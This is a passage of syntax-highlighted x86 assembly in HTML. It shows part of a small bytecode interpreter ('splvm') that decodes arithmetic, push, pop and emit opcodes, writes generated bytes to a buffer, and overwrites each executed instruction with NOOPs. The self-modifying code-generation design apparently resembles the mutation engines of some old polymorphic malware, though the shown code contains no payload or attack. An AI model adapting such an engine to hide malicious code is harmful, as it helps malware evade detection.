</span><span class="sc5">spl5exec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">spltranslateinstr</span><span class="sc0"> 
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 


</span><span class="sc1">;decode instruction "NOOP multiple"</span><span class="sc0">
</span><span class="sc5">spl_NoopM</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl6</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">250</span><span class="sc0"> </span><span class="sc1">;VI_NoopM</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_Noop</span><span class="sc0">  
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">

            
</span><span class="sc1">;decode instruction "NOOP"</span><span class="sc0">
</span><span class="sc5">spl_Noop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl7</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">235</span><span class="sc0"> </span><span class="sc1">;VI_Noop</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_End</span><span class="sc0">             
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">


</span><span class="sc1">;decode instruction "END"</span><span class="sc0">
</span><span class="sc5">spl_End</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl8</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc0"> </span><span class="sc1">;VI_End </span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_PopVariable</span><span class="sc0">         
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;decode instruction "PopVariable"</span><span class="sc0">
</span><span class="sc5">spl_PopVariable</span><span class="sc4">:</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">246</span><span class="sc0"> </span><span class="sc1">;VI_PopVariable</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_Add</span><span class="sc0">  
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">00FFh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">                   
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">    
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">popqeue</span><span class="sc0">



</span><span class="sc1">;decode instruction "ADD"</span><span class="sc0">
</span><span class="sc5">spl_Add</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl11</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">243</span><span class="sc0"> </span><span class="sc1">;VI_Add</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_Sub</span><span class="sc0">  
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">popqeue</span><span class="sc0">        
        

</span><span class="sc1">;decode instruction "SUB"</span><span class="sc0">
</span><span class="sc5">spl_Sub</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl13</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">242</span><span class="sc0"> </span><span class="sc1">;VI_Sub</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_Xor</span><span class="sc0">  
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">popqeue</span><span class="sc0">


</span><span class="sc1">;decode instruction "XOR"</span><span class="sc0">
</span><span class="sc5">spl_Xor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl15</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc0"> </span><span class="sc1">;VI_XOR</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_PopEmit</span><span class="sc0">  
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
            </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">popqeue</span><span class="sc0">    

</span><span class="sc1">;decode instruction "PopEmit"</span><span class="sc0">
</span><span class="sc5">spl_PopEmit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl16</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">236</span><span class="sc0"> </span><span class="sc1">;VI_PopEmit</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_And</span><span class="sc0">  
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0"> 
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0"> 
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0"> 
            </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">popqeue</span><span class="sc0">    

</span><span class="sc1">;decode instruction "AND"</span><span class="sc0">
</span><span class="sc5">spl_And</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl17</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">241</span><span class="sc0"> </span><span class="sc1">;VI_And</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_Or</span><span class="sc0"> 
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
            </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">popqeue</span><span class="sc0">   

</span><span class="sc1">;decode instruction "OR"</span><span class="sc0">
</span><span class="sc5">spl_Or</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl18</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">239</span><span class="sc0"> </span><span class="sc1">;VI_Or</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_ShiftL</span><span class="sc0">         
        </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
            </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">popqeue</span><span class="sc0"> 

</span><span class="sc1">;decode instruction "Shift left"</span><span class="sc0">
</span><span class="sc5">spl_ShiftL</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl19</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">238</span><span class="sc0"> </span><span class="sc1">;VI_ShiftL</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_ShiftR</span><span class="sc0">  
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
            </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">popqeue</span><span class="sc0"> 

</span><span class="sc1">;decode instruction "Shift right"</span><span class="sc0">
</span><span class="sc5">spl_ShiftR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl20</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">237</span><span class="sc0"> </span><span class="sc1">;VI_ShiftR</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_PushValueW</span><span class="sc0">  
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">       
            </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">popqeue</span><span class="sc0">


</span><span class="sc1">;decode instruction "Push ValueW"</span><span class="sc0">
</span><span class="sc5">spl_PushValueW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl21</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">249</span><span class="sc0"> </span><span class="sc1">;VI_PushValueW</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_PushVariable</span><span class="sc0">        
            </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0002</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;shift the math queue</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0004</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0006</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get the value</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">

</span><span class="sc1">;decode instruction "Push variable"</span><span class="sc0">
</span><span class="sc5">spl_PushVariable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl22</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">247</span><span class="sc0"> </span><span class="sc1">;VI_PushVariable</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_EmitVariable</span><span class="sc0">        
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">00FFh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">       
            </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0002</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;shift the math queue</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0004</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0006</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">


</span><span class="sc1">;Pop 1 item from Math queue </span><span class="sc0">
</span><span class="sc5">popqeue</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">

</span><span class="sc1">;decode instruction "EMIT variable"</span><span class="sc0">
</span><span class="sc5">spl_EmitVariable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl23</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">245</span><span class="sc0">   </span><span class="sc1">;VI_EmitVariable</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_EmitValueB</span><span class="sc0">  
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">00FFh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">spl25</span><span class="sc0"> 

</span><span class="sc5">spl_EmitValueB</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl24</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">244</span><span class="sc0"> </span><span class="sc1">;VI_EmitValueB</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_EmitValueB0</span><span class="sc0">  
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  
</span><span class="sc5">spl_EmitValueB0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl25</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0"> 
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0"> 
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0"> 
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0"> 




</span><span class="sc5">splnopping</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">splgetinstrsize</span><span class="sc0"> 
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">splonenop</span><span class="sc0"> 
    
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">250</span><span class="sc0">  </span><span class="sc1">;VI_NoopM </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">splnopinside</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">235</span><span class="sc0">  </span><span class="sc1">;VI_Noop   </span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">splnopinside</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">234</span><span class="sc0">  </span><span class="sc1">;VI_End</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splreturn</span><span class="sc0"> 

</span><span class="sc5">splonenop</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">235</span><span class="sc0">  </span><span class="sc1">;VI_Noop</span><span class="sc0">

</span><span class="sc5">splreturn</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">splreturning</span><span class="sc4">:</span><span class="sc0"> 
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> 
            </span><span class="sc6">RET</span><span class="sc0"> 



</span><span class="sc1">;BP= returns the size of instruction on DS:[SI]         </span><span class="sc0">

</span><span class="sc5">splgetinstrsize</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0"> 
</span><span class="sc5">splgetinstrsize4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">250</span><span class="sc0">        
          </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">splgetinstrsize2</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">254</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">splgetinstrsize3</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">splgetinstrsize3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">splgetinstrsize6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">splgetinstrsize4</span><span class="sc0">       
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">splgetinstrsize6</span><span class="sc0">      
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">splgetinstrsize2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">splgetinstrsize5</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">splgetinstrsize5</span><span class="sc4">:</span><span class="sc0"> 
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">244</span><span class="sc0">
          </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">splgetinstrsize1</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">249</span><span class="sc0">
          </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">splgetinstrsize1</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">splgetinstrsize1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">splvm</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">   
</span><span class="sc1">;------------------------------------------------------</span><span class="sc0">

</span></div></body>
</html>
